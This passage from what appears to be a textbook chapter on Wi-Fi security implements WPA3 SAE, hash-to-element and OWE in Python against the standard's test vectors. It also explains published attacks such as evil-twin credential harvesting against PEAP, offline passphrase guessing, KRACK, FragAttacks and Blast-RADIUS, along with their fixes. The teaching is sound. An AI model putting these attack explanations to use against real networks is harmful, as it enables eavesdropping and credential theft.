peer_element = (int.from_bytes(peer[34:66], "big"), int.from_bytes(peer[66:98], "big"))

pwe = pwe_hunt_and_peck(b"mekmitasdigoat", a1, a2)
scalar, element = commit(pwe, rand, mask)
msg = (19).to_bytes(2, "little") + i2b(scalar) + i2b(element[0]) + i2b(element[1])
print("commit:", msg[:16].hex(), "...", msg[-6:].hex(), len(msg), "bytes")
kck, pmk, pmkid = keys(pwe, rand, scalar, peer_scalar, peer_element)
print("KCK  ", kck.hex())
print("PMK  ", pmk.hex())
print("PMKID", pmkid.hex())
```

It prints:

```text
commit: 13002e2c0f0db52440ad146d967114ce ... 72621325dbe1 98 bytes
KCK   1e733f6d9bd53256287304338831b09a39406d121017073a5c30db36f36cb81a
PMK   4e4dfab1a2dd8ac1a91790f953faaa452ae5c6873ab75b63605ba663f8a7fe59
PMKID 8747a600eea3f9f22475df58ca1e5498
```

The commit, KCK, PMK and PMKID are those of Annex J.10, byte for byte. Three
details each change every output if missed: the group number is little-endian
(`13 00`), so are the KDF's counter and length fields, and the low bit of the
successful round's seed picks the sign of $y$. The PMKID is just the first 16
bytes of the scalar sum, which an eavesdropper also sees.

Now hash-to-element. The same Annex gives the PT and PWE for the SSID
`byteme`, the same password, the password identifier `psk4internet`, and a
second pair of MAC addresses:

```python
# Uses add(), mul(), H(), i2b(), p, r and b from the listing above.
# Hash-to-element (802.11-2020 12.4.4.2.3): the password becomes a point PT with
# the simplified SWU map of RFC 9380, once per network; no loop, no early exit.
def is_square(v): return pow(v, (p - 1) // 2, p) in (0, 1)
def sswu(u, A=p - 3, Z=p - 10):                     # P-256: A = -3, Z = -10
    t = (Z * Z * u**4 + Z * u * u) % p
    x1 = (-b * pow(A, -1, p) * (1 + pow(t, -1, p))) % p if t else b * pow(Z * A, -1, p) % p
    gx1 = (x1**3 + A * x1 + b) % p
    x2 = Z * u * u * x1 % p
    x = x1 if is_square(gx1) else x2                # one of the two always works
    y = pow((x**3 + A * x + b) % p, (p + 1) // 4, p)
    return (x, y) if y % 2 == u % 2 else (x, p - y)

def hkdf_expand(prk, info, n):
    out, t, i = b"", b"", 1
    while len(out) < n:
        t = H(prk, t + info + bytes([i])); out += t; i += 1
    return out[:n]
def password_token(ssid, password, identifier=b""):
    seed = H(ssid, password + identifier)           # HKDF-Extract(salt = SSID)
    u1 = int.from_bytes(hkdf_expand(seed, b"SAE Hash to Element u1 P1", 48), "big") % p
    u2 = int.from_bytes(hkdf_expand(seed, b"SAE Hash to Element u2 P2", 48), "big") % p
    return add(sswu(u1), sswu(u2))
def pwe_from_pt(pt, mac1, mac2):                    # per connection: one multiplication
    val = int.from_bytes(H(bytes(32), max(mac1, mac2) + min(mac1, mac2)), "big")
    return mul(val % (r - 1) + 1, pt)

pt = password_token(b"byteme", b"mekmitasdigoat", b"psk4internet")
pwe = pwe_from_pt(pt, bytes.fromhex("00095b66ec1e"), bytes.fromhex("000b6bd90246"))
print("PT  x", i2b(pt[0]).hex())
print("PWE x", i2b(pwe[0]).hex())
print("PWE y", i2b(pwe[1]).hex())
```

It prints:

```text
PT  x b6e38c98750c684b5d17c3d8c9a4100b39931279187ca6cced5f37ef46ddfa97
PWE x c93049b9e64000f848201649e999f2b5c22dea69b5632c9df4d633b8aa1f6c1e
PWE y 73634e94b53d82e7383a8d258199d9dc1a5ee8269d060382ccbf33e614ff59a0
```

The PWE matches the standard's vector. 802.11 only had to choose the HKDF
labels, the 48-byte length and $Z = -10$, the same constant as RFC 9380's
P-256 suite. (Python's `pow` and `if` are not constant time; what matters is
that the algorithm has no data-dependent loop.) The rest of SAE is unchanged
except the keyseed, whose HMAC key becomes the list of rejected groups, if
any: the fix for the group downgrade of §9.8.

**Deployment.** An AP announces H2E in its beacons (the RSN extension
element), and one that accepts only H2E adds an "SAE H2E only" selector;
hostapd's `sae_pwe` setting is 0 for hunting and pecking, 1 for H2E only, 2
for both. On 6 GHz only H2E is allowed. **Password identifiers** let one
network hold several passwords, each named in the clear in the commit; the
AP keeps one $\mathit{PT}$ per identifier.

## 9.10 Enterprise: 802.1X and EAP

*Level: intermediate.*

Companies and universities do not share one password. In **WPA2- or
WPA3-Enterprise**, the access point is only a relay: the device logs in to a
**RADIUS** server behind it using the **Extensible Authentication Protocol**
over 802.1X, and the server gives the access point a PMK for that one session.
Each user and session has its own PMK, so one user cannot decrypt another's
traffic, and leaving staff can be removed centrally. The world's largest
example is **eduroam**, which lets students and staff of thousands of
universities log in on each other's campuses with their home credentials.

The common EAP methods all run TLS (Chapter 3) between the device and the
server:

- **EAP-TLS** (RFC 5216, and RFC 9190 for TLS 1.3): both sides present
  certificates. It is the strongest option and the hardest to deploy, because
  every device needs a certificate.
- **PEAP** and **EAP-TTLS**: only the server presents a certificate; inside the
  TLS tunnel, the user proves a password, usually with **MS-CHAPv2**.

The weak point is the server certificate. Many devices were configured, or let
their users configure them, to accept any server certificate, or to ask the user
to click "trust". An attacker then sets up an access point with the network's
name, a RADIUS server with its own certificate, and collects the MS-CHAPv2
exchanges of everyone whose device connects. In 2012 Moxie Marlinspike and
David Hulton showed that MS-CHAPv2 reduces to finding a single 56-bit DES key,
which they offered to crack as an online service within a day, so every
captured exchange yields the user's password hash, which logs in as the user.
The fix is configuration: devices must pin the server's CA and name, which
modern operating systems do when the network is set up with a profile.

WPA3-Enterprise also has a **192-bit mode** for governments, which fixes the
suite to GCMP-256, HMAC-SHA-384, P-384 and EAP-TLS with matching certificates.

### One EAP-TLS login, step by step

The device speaks EAP to the access point inside EAPOL frames; the access
point relays it to the RADIUS server inside RADIUS packets and never sees the
credentials.

<div class="mars-steps" markdown>

1. The device gives an **outer identity** such as
   `anonymous@arcadia.example`; only the realm is needed, to route the request.
2. A full TLS handshake (Chapter 3) runs inside EAP messages, in fragments.
   The device checks the server's chain against the CA and server name it was
   configured with, then sends its own certificate and proves it holds the key.
3. Both sides export keying material from the TLS session: with TLS 1.3 (RFC
   9190), 128 bytes from the exporter labeled `EXPORTER_EAP_TLS_Key_Material`,
   whose first 64 bytes are the **master session key** (MSK).
4. The server's RADIUS **Access-Accept** carries the MSK to the AP in two
   attributes, hidden with an MD5-based scheme keyed by the RADIUS shared
   secret.
5. Both take the first 256 bits of the MSK as the PMK and run the 4-way
   handshake of §9.4.

</div>

The PMK thus crosses the wired network under a shared secret that is often
short and rarely changed, so many networks now carry RADIUS inside TLS
(**RadSec**, RFC 6614).

### Blast-RADIUS (2024)

RADIUS dates from 1991, and over UDP it authenticates a response with an ad
hoc construction, the MD5 of the response, the request's random authenticator
and the shared secret. In July 2024 Sharon Goldberg, Miro Haller, Nadia
Heninger, Mike Milano, Dan Shumow, Marc Stevens and Adam Suhl published
**Blast-RADIUS** (CVE-2024-3596, USENIX Security 2024). An attacker on the
path between the access server and the RADIUS server computes an MD5
chosen-prefix collision between an Access-Reject and an Access-Accept, hides
the collision blocks in an attribute the server echoes back, and turns a
rejection into an acceptance without learning the secret. The collision must
be found while the client waits; the proof of concept took 3 to 6 minutes on
a modest cluster, beyond common timeouts but not all. The fix is to require
the **Message-Authenticator** attribute, an HMAC-MD5 over the whole packet,
on every packet, and in the longer run to move RADIUS into TLS.

Enterprise Wi-Fi was spared only because RFC 3579 already required
Message-Authenticator on every packet carrying EAP; the protocol that delivers
its keys still relied on raw MD5 in 2024, twenty years after Xiaoyun Wang's
collisions.

## 9.11 Open networks and management frames

*Level: intermediate.*

**Open networks.** A café's Wi-Fi with no password used to mean no encryption
at all: anyone nearby could read every unencrypted frame. **Opportunistic
Wireless Encryption** (OWE, RFC 8110, 2017), certified as **Wi-Fi Enhanced
Open**, adds an unauthenticated Diffie-Hellman exchange during association, so
each device gets its own PMK. It stops passive eavesdropping; it cannot stop an
attacker who runs a fake access point with the same name, since nothing is
authenticated. A transition mode lets old devices keep joining the same network
unencrypted.

### How OWE runs

OWE adds no new messages. After the usual open-system authentication, the
device puts a Diffie-Hellman Parameter element into its **association
request**: a two-byte little-endian group number (19, P-256, is mandatory) and
its public key, for a NIST curve in "compact" form, the $x$ coordinate alone.
The AP answers with its own key in the **association response**, and each
side derives, following RFC 8110,

$$
\begin{aligned}
z &= x\text{-coordinate of } \mathrm{DH}(\text{own private key},\ \text{peer public key}),\\
\mathit{prk} &= \mathrm{HKDF\text{-}Extract}(C \,\|\, A \,\|\, \mathit{group},\ z),\\
\mathrm{PMK} &= \mathrm{HKDF\text{-}Expand}(\mathit{prk},\ \texttt{"OWE Key Generation"},\ 32),\\
\mathrm{PMKID} &= \text{first 16 bytes of } \mathrm{SHA\text{-}256}(C \,\|\, A),
\end{aligned}
$$

where $C$ and $A$ are the two public keys as sent. The 4-way handshake then
runs with that PMK, with PMF required. The compact form costs nothing: $x$
fits two points, $(x, \pm y)$, and either one times a private key has the
same $x$ coordinate, which is all that $z$ uses.

<figure class="mars-fig">
<svg viewBox="0 0 640 300" width="640" role="img" aria-label="OWE. The device sends open authentication, then an association request carrying its Diffie-Hellman public key C. The access point answers with an association response carrying its public key A. Both compute the PMK from the shared secret and both public keys, then run the 4-way handshake. A passive listener sees C and A but cannot compute the PMK; an active fake access point can run its own exchange because nothing is authenticated." fill="currentColor" font-size="13">
<text x="100" y="22" text-anchor="middle" font-weight="bold">device</text>
<text x="540" y="22" text-anchor="middle" font-weight="bold">access point</text>
<line x1="100" y1="32" x2="100" y2="250" stroke="currentColor"/>
<line x1="540" y1="32" x2="540" y2="250" stroke="currentColor"/>
<line x1="100" y1="60" x2="536" y2="60" stroke="currentColor" stroke-opacity=".6"/>
<polygon points="540,60 528,55 528,65"/>
<text x="320" y="53" text-anchor="middle" font-size="12">open-system authentication (no secret)</text>
<line x1="100" y1="100" x2="536" y2="100" stroke="currentColor" stroke-width="1.5"/>
<polygon points="540,100 528,95 528,105"/>
<text x="320" y="93" text-anchor="middle">association request + DH element: group 19, C</text>
<line x1="540" y1="140" x2="104" y2="140" stroke="currentColor" stroke-width="1.5"/>
<polygon points="100,140 112,135 112,145"/>
<text x="320" y="133" text-anchor="middle">association response + DH element: group 19, A</text>
<rect x="130" y="155" width="380" height="26" rx="4" fill-opacity=".14" stroke="currentColor"/>
<text x="320" y="173" text-anchor="middle" font-size="12.5">both: z = DH, PMK = HKDF(C | A | group, z)</text>
<line x1="100" y1="210" x2="536" y2="210" stroke="currentColor" stroke-width="2" stroke-dasharray="6 4"/>
<text x="320" y="202" text-anchor="middle">4-way handshake with this PMK, PMF on</text>
<text x="320" y="272" text-anchor="middle" font-size="12.5">a listener sees C and A only: passive sniffing stops</text>
<text x="320" y="291" text-anchor="middle" font-size="12.5" fill-opacity=".7">a fake AP runs its own exchange: active attacks do not</text>
</svg>
<figcaption>Figure 9.7. Opportunistic Wireless Encryption. The Diffie-Hellman keys ride in the association frames the device sends anyway; nothing in the exchange says who the access point is.</figcaption>
</figure>

### Code it: OWE on P-256

The program reuses the P-256 arithmetic and HKDF from §9.9, runs the exchange
for a café laptop and the café's AP, and then lets an evil twin with the same
SSID do the same.

```python
# Uses add(), mul(), H(), hkdf_expand(), i2b(), p and b from the listings above.
# OWE (RFC 8110): plain ECDH in the association frames, then a PMK from HKDF.
import hashlib
G = (0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
     0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)
def lift(xb):                                       # "compact" key: x only; either y works
    x = int.from_bytes(xb, "big")
    return (x, pow((x**3 - 3 * x + b) % p, (p + 1) // 4, p))
def owe_pmk(my_secret, C, A):                       # C: client's key, A: AP's key, as sent
    peer = A if i2b(mul(my_secret, G)[0]) == C else C
    z = i2b(mul(my_secret, lift(peer))[0])
    prk = H(C + A + (19).to_bytes(2, "little"), z)  # HKDF-Extract(C | A | group, z)
    return hkdf_expand(prk, b"OWE Key Generation", 32)

x_c = int.from_bytes(hashlib.sha256(b"cafe laptop").digest(), "big")
x_a = int.from_bytes(hashlib.sha256(b"cafe access point").digest(), "big")
C, A = i2b(mul(x_c, G)[0]), i2b(mul(x_a, G)[0])    # in association request / response
print("client PMK", owe_pmk(x_c, C, A).hex()[:32])
print("AP PMK    ", owe_pmk(x_a, C, A).hex()[:32])
print("PMKID     ", hashlib.sha256(C + A).digest()[:16].hex())
x_m = int.from_bytes(hashlib.sha256(b"evil twin").digest(), "big")
M = i2b(mul(x_m, G)[0])                             # a fake AP with the same name
print("client and evil twin agree:", owe_pmk(x_c, C, M) == owe_pmk(x_m, C, M))
```

It prints:

```text
client PMK 5c9d3b778f1c74ad42827320d629d646
AP PMK     5c9d3b778f1c74ad42827320d629d646
PMKID      f2af94fcde2c284e82f9b0baba15b3cd
client and evil twin agree: True
```

The last line is the whole limit of OWE: with no secret, the evil twin
completes its own exchange and the device has an encrypted link to the
attacker. It is still a real gain. Passive recording, which needs only a
laptop in the corner, now gets nothing; an active attacker must transmit, can
be detected, and must stay in the path all session. And each device has its
own PMK, unlike a WPA2-Personal café whose password is on the wall (the case
SAE-PK, §9.15, was designed for).

**OWE transition mode** runs two networks: an open one with the advertised
name, whose beacons point to a hidden OWE network. Devices that know OWE
follow the pointer; old ones stay open. An attacker who strips the pointer
pushes a device onto the open network, no worse than before OWE.

**Captive portals**, the sign-in pages of hotels and airports, are not Wi-Fi
security at all; they control who may use the network after joining, usually by
MAC address, which anyone nearby can copy.

**Management frames.** Until 2009 the frames that control a connection, above
all **deauthentication** ("you are disconnected"), were never authenticated,
even under WPA2. Anyone could send them in anyone's name, to knock devices off a
network, to force a reconnection and capture a handshake, or to push devices
toward a fake access point. In 2014 the US Federal Communications Commission
fined a Marriott hotel 600,000 US dollars for sending deauthentication frames to guests'
own mobile hotspots so they would pay for the hotel's Wi-Fi. **Protected
management frames** (PMF, 802.11w, 2009) encrypt unicast management frames
under the TK and authenticate broadcast ones with **BIP** under the IGTK. PMF
was optional in WPA2 and is mandatory in WPA3.

### What PMF protects, and what it cannot

**BIP** (broadcast integrity protocol) appends to each broadcast management
frame a six-byte packet number and a MAC, originally AES-CMAC-128 truncated to
8 bytes; receivers drop frames whose packet number does not increase.

Protection creates its own problem: a device that rebooted has lost its keys
and cannot send a protected frame, while an attacker could send an unprotected
association request in a live device's name to tear down its session. The
**SA Query** procedure resolves both. When the AP receives an unprotected
association request for a device that already has keys, it sends that device
a protected SA Query and tells the requester to come back later. A live
device answers, proving the request forged; a rebooted one cannot, and after
the timeout its new association is accepted.

PMF cannot protect frames sent before keys exist (beacons, probes,
authentication, association), stop **radio jamming**, or stop a device from
being lured to a fake AP. IEEE 802.11-2020 added **beacon protection**, a MIC
under a beacon integrity group key, so an associated device can spot a forged
beacon that tries to change its network's settings; Wi-Fi 7 certification
requires it.

## 9.12 Frames, queues and names: FragAttacks to AirSnitch

*Level: intermediate.*

Later attacks went below the handshake, into how frames are assembled.

**FragAttacks** (Vanhoef, USENIX Security 2021) were a dozen flaws in
fragmentation and frame aggregation, three of them in the 802.11 standard
itself and present since 1997. In the main design flaw, a bit that says whether
an encrypted frame contains several aggregated subframes was not
authenticated, so an attacker could flip it and make the receiver parse
attacker-chosen data inside the encrypted payload as separate frames, injecting
packets into a WPA2 or WPA3 network. Implementations were patched, and the
standard gained an option, "signaling and payload protected" aggregation, that
authenticates the flag.

The three design flaws, disclosed on 11 May 2021 after nine months of
coordinated fixes, each came from a field or a buffer the cryptography did not
cover:

- **Aggregation** (CVE-2020-24588). The "is aggregated" bit, which says a frame
  packs several A-MSDU subframes, is not covered by CCMP's MIC. The attacker
  makes the victim fetch a packet whose payload it controls, sets the bit on
  the encrypted frame, and the victim parses the attacker's bytes as
  subframes, for example a router advertisement naming a malicious DNS server.
- **Mixed keys** (CVE-2020-24587). Nothing required all fragments of one packet
  to be encrypted under the same key, so fragments from before and after a
  rekey could be spliced together to exfiltrate data.
- **Fragment cache** (CVE-2020-24586). Receivers kept incomplete fragments
  across a reconnection, so on a network whose users do not trust each other
  an attacker could leave a fragment to be joined to a victim's.

Implementation bugs, such as accepting plaintext fragments on a protected
network, were often easier to exploit than the design flaws.

**Power-save queues.** A device that sleeps sets a power management bit in a
frame header, and the AP buffers frames for it. Domien Schepers, Aanjhan
Ranganathan and Mathy Vanhoef ("Framing frames", USENIX Security 2023) noted
that the bit is not authenticated and the standard said nothing about the
security context of buffered frames. An attacker spoofs a frame that puts the
victim to sleep, then forces a disconnection in its name; the AP drops the
victim's keys but keeps the queue, and many APs then sent the queued frames in
plaintext, under the group key or under an all-zero key. Their **MacStealer**
tool turned this against client isolation: an insider reconnects with the
victim's MAC address and receives frames meant for the victim, such as the
reply to a request it had just sent.

**Network names.** In WPA2-Personal the SSID salts PBKDF2, so a wrong name
gives a wrong PMK. Nothing else ties the name to the keys: not hunting and
pecking, not OWE, not Enterprise logins. Héloïse Gollier and Mathy Vanhoef's
**SSID confusion** attack (CVE-2023-52424, WiSec 2024) uses this. Where two
networks share credentials, say "Habitat" and an older, weaker
"Habitat-legacy", an attacker relays the second under the first's name on
another channel; the device authenticates, because the credentials match,
and shows "Habitat". Some VPN clients switch off on networks they trust by
name. Hash-to-element puts the SSID into $\mathit{PT}$ (§9.9) and resists;
for the rest, the authors proposed authenticating the SSID in the handshake,
and meanwhile networks should not share passwords, or in Enterprise RADIUS
server names, across SSIDs.

**Group keys.** Every device on a network holds the same GTK, so any of them can
forge broadcast frames that look as if they came from the access point. Many
networks rely on **client isolation** to stop users attacking each other, and
the **AirSnitch** attacks (NDSS 2026) showed how a malicious client can bypass
it on many access points, using the shared group key and the way traffic is
forwarded between clients. WPA3 and PMF alone do not prevent it; isolation must
be enforced properly in the access point.

The lesson of all four is that a channel is only as secure as everything the
receiver does with a frame after the MIC checks, and everything the
cryptography leaves out: a header bit, a queue, a name.

## 9.13 Mars: radio in a city of domes

*Level: intermediate.*

Arcadia City is a place where almost everything is wireless: suits, rovers,
sensors in every wall, residents' tablets. None of it crosses the gap to Earth
directly, so Wi-Fi faces the same short-range threats it faces on Earth, with
three differences.

First, **outside is not empty**. Rovers and suits outside the domes talk to
the city by radio across open plains with no walls in the way, so their links
can be heard from much farther than a house's Wi-Fi. A shared WPA2-Personal
password on a work network for two thousand residents would be cracked offline
by anyone who recorded one handshake. The city would use WPA3-Enterprise with
EAP-TLS: each suit and rover has its own certificate from the city's CA
(Chapter 2), revocable the moment one is lost.

Second, **some devices cannot be patched quickly**. A sensor that ships to Mars
with WPA2 firmware may run it for twenty years, which is why the KRACK and
FragAttacks lessons apply with extra force: the city would put such devices on
their own network segment, and never trust a frame from the air more than the
protocol has proved.

Third, **nothing in a login may wait for Earth**. An eduroam login can cross an
ocean to a home university and back in a fraction of a second; from Arcadia
City the round trip takes 6 to 44 minutes, and none at all during solar
conjunction. EAP needs several round trips and access points give up after
seconds, so the RADIUS servers, the CA for suits and rovers, and its
revocation list must live in the city. A visitor with Earth credentials would
get a local credential on arrival, perhaps pre-signed by the home institution
and carried on the ship.

The rest follows from this chapter: EAP-TLS with pinned server certificates,
and RADIUS over TLS, since a Blast-RADIUS attacker needs only a cable in a
maintenance shaft; WPA3-Personal with hash-to-element for sensor networks too
small for certificates, with $\mathit{PT}$ computed once per sensor and a
different password per SSID, so SSID confusion has nothing to confuse; OWE for
the public plaza network. A lost suit's certificate is revoked at its next
login, with no message to Earth.

## 9.14 In the real world

*Level: intermediate.*

- **What to configure.** WPA3-Personal (SAE) with H2E and PMF required, or WPA3
  transition mode with transition disable if old devices must join; never
  TKIP; WPA2-Personal only with a long random passphrase; Enterprise with
  EAP-TLS where possible and the server certificate pinned on every device; OWE
  for open networks.
- **6 GHz and Wi-Fi 7.** On the 6 GHz band (Wi-Fi 6E and 7), only WPA3-Personal
  with H2E, WPA3-Enterprise and OWE are allowed, with PMF required. There is no
  WPA2 at all, which finally ends the transition problem on that band. Wi-Fi 7
  certification adds GCMP-256 and beacon protection.
- **WPA2's long tail.** Hundreds of millions of WPA2-only devices, printers,
  televisions and industrial equipment among them, will keep transition mode
  alive on 2.4 and 5 GHz for years. WPA3 version 3.4 (2024) added a way for an
  access point to advertise WPA2 to old clients and WPA3 to new ones under one
  name, so that new clients are not tempted downward.
- **Tools.** `wpa_passphrase` prints the WPA2 PMK; `wpa_cli status` shows the
  negotiated key management, ciphers, PMF and SAE group; `iw dev wlan0 scan`
  shows each network's RSN element. On the run quoted in §9.5, `wpa_cli`
  reported `key_mgmt=SAE`, `pairwise_cipher=CCMP`, `sae_group=19` and `pmf=1`
  for the WPA3 client.

## 9.15 Going deeper

*Level: expert.*

**Proofs and their scope.** Changhua He, Mukund Sundararajan, Anupam Datta,
Ante Derek and John Mitchell proved the 4-way handshake secure in 2005, in a
model where each key is installed once. KRACK lived in what that model left
out. Cremers, Kiesl and Medinger's 2020 model includes the state machine,
retransmissions, key installation and the group key handshake, and showed
that the patched standard is secure. It is a direct instance of [Chapter 20](20-Designing-and-Verifying-Protocols.md)'s
theme: the model must include the state that the implementation keeps.

**SAE's security.** Jean Lancrenon and Marjan Škrobot (2015) proved Dragonfly
secure in a random-oracle model, after earlier criticism of its ad hoc design.
The protocol's design also makes the confirm messages the only place where a
password guess is tested, which is what rate limiting relies on. Version 3.0's
**SAE-PK** goes further for public networks (a café that prints its password on
the wall): the access point has a key pair, the printed "password" encodes a
fingerprint of its public key, and the access point proves possession of the
private key during SAE, so a fake access point that knows the password still
cannot impersonate the real one.

**Fast transition.** In large networks a device moves between access points
many times a minute. 802.11r **fast BSS transition** derives a key hierarchy
across a group of access points so that a device can roam with two messages
instead of a full EAP login and 4-way handshake. The extra key levels (PMK-R0,
PMK-R1) are held by different devices, and KRACK's original paper found a key
reinstallation in the fast transition handshake too.

**Why AES-CCM, not GCM.** CCM needs only the AES encryption direction and fit
the hardware of 2004. GCMP arrived with 802.11ad (60 GHz) in 2012 and became
the high-end choice; GCM's GHASH is faster in hardware at Wi-Fi 7's speeds.
GCM's weakness under nonce reuse (Chapter 4) makes KRACK-style reinstallation
far more serious with GCMP, which allowed forgery, than with CCMP.

## Check yourself

??? question "1. Give two reasons WEP's CRC-32 ICV failed as integrity protection."
    It is linear, so ciphertext bits can be flipped and the encrypted checksum
    corrected without the key; and it has no key at all, so anyone who knows a
    plaintext can compute it. A MAC needs a secret key and must not be linear.

??? question "2. What are the PMK, PTK and GTK, and which are unique to one device?"
    PMK: the long-term secret (from the passphrase, SAE or EAP); unique per
    device only with SAE or Enterprise. PTK: per connection, from the PMK,
    addresses and nonces; unique. GTK: the group key for broadcast, shared by
    all devices on the network.

??? question "3. Why can a WPA2-Personal passphrase be guessed offline from one handshake, and what does the PMKID variant save the attacker?"
    The PMK depends only on the passphrase and SSID, the nonces and addresses
    are in the clear, and message 2's MIC depends on all of them, so each guess
    is checked against the MIC offline. The PMKID depends only on the PMK and
    the addresses, so the attacker needs just the AP, not a client.

??? question "4. In KRACK, why does the device accept the replayed message 3, and why does reinstalling the key break CCMP?"
    The retransmission carries a higher replay counter, so it passes the
    freshness check, and the standard said to answer it. Installing a key
    resets its packet number, part of the CCMP nonce, so new frames reuse
    nonces, and counter-mode keystream, under the same key.

??? question "5. Why does an SAE recording not help a password guesser?"
    To test a guess, the attacker would need $\mathit{rand}$ or
    $\mathit{mask}$, which are protected by the elliptic curve discrete
    logarithm problem; the transcript has no value that is a function of the
    password alone. Each guess requires a live run of the protocol.

??? question "6. In the group of squares modulo 23 with $\mathit{PWE} = 4$, a device picks $\mathit{rand} = 2$ and $\mathit{mask} = 3$. What commit does it send?"
    $\mathit{scalar} = 2 + 3 = 5$ (modulo 11). $4^3 = 64 \equiv 18$, and the
    inverse of 18 modulo 23 is 9, so $\mathit{element} = 9$. It sends
    $(5, 9)$: the same element as in §9.7, since the mask is the same.

??? question "7. What did Dragonblood's timing attack measure, and why does each measurement keep about a third of a dictionary?"
    The round at which hunting and pecking found the password element, which
    depends on the password and the attacker's chosen MAC address. The round
    is $k$ with probability $2^{-k}$, so a wrong password matches with
    probability $\sum_k 4^{-k} = 1/3$ on average.

??? question "8. Hash-to-element computes $\mathit{PT}$ from the SSID and password, then $\mathit{PWE} = \mathit{val} \cdot \mathit{PT}$ from the MAC addresses. Why does this stop Dragonblood's timing attack?"
    Computing $\mathit{PT}$, the only step that involves the password, does
    not involve the MAC addresses, so spoofing yields no new observations, and
    the SWU map has no loop. The per-connection step is one constant-time
    scalar multiplication of a fixed point.

??? question "9. In WPA3 transition mode, how does a fake WPA2-only access point get a crackable value without knowing the password, and what stops it?"
    It sends an unauthenticated message 1 with any ANonce and receives
    message 2 with its MIC, which can be cracked offline; the device would
    notice only at message 3. Transition disable makes a device that has used
    WPA3 on a network refuse WPA2 there afterwards.

??? question "10. Name one way a fake access point defeats PEAP with MS-CHAPv2, and why OWE cannot stop a fake access point at all."
    A device that accepts any server certificate hands its MS-CHAPv2 exchange,
    worth one DES key, to the fake AP's RADIUS server; pinning the CA and
    server name prevents it. OWE's Diffie-Hellman is unauthenticated, so a
    fake AP simply completes its own exchange.

## What you learned

- WEP failed because of a linear checksum, short IVs and an IV glued to the key;
  TKIP was a temporary patch.
- WPA2 derives a fresh PTK at every connection in the 4-way handshake, but in
  Personal mode the PMK comes from the passphrase alone, so one handshake, or
  one PMKID, allows offline guessing, and there is no forward secrecy.
- KRACK broke implementations of a proven handshake by replaying message 3,
  which reset packet numbers and reused nonces.
- WPA3's SAE is a PAKE: a recording gives nothing to guess against, each guess
  costs a live exchange, and sessions are forward secret; Dragonblood showed
  that its implementation must be constant-time, and H2E made that easy.
- Hash-to-element turns the password into a fixed point with the simplified
  SWU map, once per network, and lets the MAC addresses touch only a public
  multiplier; SAE run this way matches the standard's Annex J.10 vectors.
- Enterprise Wi-Fi gives each user a PMK through EAP and depends on devices
  checking the server's certificate; EAP's Message-Authenticator spared it
  from Blast-RADIUS.
- OWE's unauthenticated Diffie-Hellman stops passive recording, not an evil
  twin; PMF protects management frames; aggregation, fragment caches,
  power-save queues, network names and group keys remain attack surfaces.
- A habitat network authenticates locally: no login can wait 6 to 44 minutes
  for Earth.

**Next:** [Chapter 10](10-DNSSEC-and-Private-DNS.md), securing the system that
turns names into addresses.

## Further reading

- IEEE Std 802.11-2024 (which includes 802.11i, 802.11w and 802.11r), Annex J
  for test vectors; the Wi-Fi Alliance's WPA3 Specification, version 3.5
  (2025).
- RFC 7664 (Dragonfly), RFC 8110 (OWE), RFC 9380 (hashing to elliptic curves),
  RFC 5216 and RFC 9190 (EAP-TLS).
- Nikita Borisov, Ian Goldberg and David Wagner, "Intercepting mobile
  communications: the insecurity of 802.11" (MobiCom 2001).
- Scott Fluhrer, Itsik Mantin and Adi Shamir, "Weaknesses in the key scheduling
  algorithm of RC4" (SAC 2001).
- Erik Tews, Ralf-Philipp Weinmann and Andrei Pyshkin, "Breaking 104 bit WEP in
  less than 60 seconds" (WISA 2007).
- Martin Beck and Erik Tews, "Practical attacks against WEP and WPA" (2008).
- Changhua He, Mukund Sundararajan, Anupam Datta, Ante Derek and John C.
  Mitchell, "A modular correctness proof of IEEE 802.11i and TLS" (CCS 2005).
- Mathy Vanhoef and Frank Piessens, "Key reinstallation attacks: forcing nonce
  reuse in WPA2" (CCS 2017).
- Mathy Vanhoef and Eyal Ronen, "Dragonblood: analyzing the Dragonfly handshake
  of WPA3 and EAP-pwd" (IEEE S&P 2020).
- Mathy Vanhoef, "Fragment and forge: breaking Wi-Fi through frame aggregation
  and fragmentation" (USENIX Security 2021).
- Cas Cremers, Benjamin Kiesl and Niklas Medinger, "A formal analysis of IEEE
  802.11's WPA2: countering the KRACKs caused by cryptographic protocols"
  (USENIX Security 2020).
- Jean Lancrenon and Marjan Škrobot, "On the provable security of the Dragonfly
  protocol" (ISC 2015).
- Jens Steube, "New attack on WPA/WPA2 using PMKID", hashcat forum (August
  2018).
- The AirSnitch paper (NDSS 2026), papers.mathyvanhoef.com.
- IEEE Std 802.11-2020, §12.4 (SAE and hash-to-element) and Annex J.10 (SAE
  test vectors, also in hostapd's module tests).
- RFC 3579 (RADIUS support for EAP, 2003), RFC 6614 (RADIUS over TLS, 2012).
- Mathy Vanhoef and Frank Piessens, "Advanced Wi-Fi attacks using commodity
  hardware" (ACSAC 2014), the channel-based man in the middle.
- Mathy Vanhoef and Frank Piessens, "Release the Kraken: new KRACKs in the
  802.11 standard" (CCS 2018).
- Daniel De Almeida Braga, Pierre-Alain Fouque and Mohamed Sabt, "Dragonblood
  is still leaking: practical cache-based side-channel in the wild" (ACSAC
  2020).
- Domien Schepers, Aanjhan Ranganathan and Mathy Vanhoef, "Framing frames:
  bypassing Wi-Fi encryption by manipulating transmit queues" (USENIX Security
  2023).
- Héloïse Gollier and Mathy Vanhoef, the SSID confusion paper (ACM WiSec
  2024), papers.mathyvanhoef.com/wisec2024.pdf.
- Sharon Goldberg, Miro Haller, Nadia Heninger, Mike Milano, Dan Shumow, Marc
  Stevens and Adam Suhl, "RADIUS/UDP considered harmful" (USENIX Security
  2024), the Blast-RADIUS paper.
